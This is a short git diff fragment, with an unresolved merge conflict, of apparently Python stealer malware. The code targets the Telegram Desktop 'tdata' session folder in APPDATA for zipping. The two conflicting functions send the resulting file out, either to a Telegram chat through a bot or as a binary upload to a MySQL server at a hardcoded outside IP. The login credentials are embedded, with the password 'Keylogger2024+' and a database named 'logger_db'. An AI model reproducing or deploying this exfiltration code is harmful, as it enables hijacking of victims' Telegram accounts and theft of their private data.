@@ -21,11 +21,29 @@ async def send_test_message(bot_token, chat_id):
     async with bot:
         await bot.send_message(chat_id, "Тестовое сообщение.")
 
+<<<<<<< HEAD
 async def send_file_to_user(file_path, bot_token, chat_id):
     bot = Bot(token=bot_token)
     async with bot:
         input_file = FSInputFile(file_path)
         await bot.send_document(chat_id, document=input_file)
+=======
+def save_file_to_db(file_path):
+    connection = pymysql.connect(
+        host='38.180.219.103',
+        port=3306,
+        user='user',
+        password='Keylogger2024+',
+        database='logger_db'
+    )
+    cursor = connection.cursor()
+    with open(file_path, 'rb') as f:
+        binary_data = f.read()
+    cursor.execute("INSERT INTO users_data (file) VALUES (%s)", (binary_data,))
+    connection.commit()
+    cursor.close()
+    connection.close()
+>>>>>>> 3c4de78d2f9706f56da0f793ada07f02b384e939
 
 # Определяем переменные
 folder_to_zip = os.path.join(os.getenv('APPDATA'), r'Telegram Desktop\tdata')
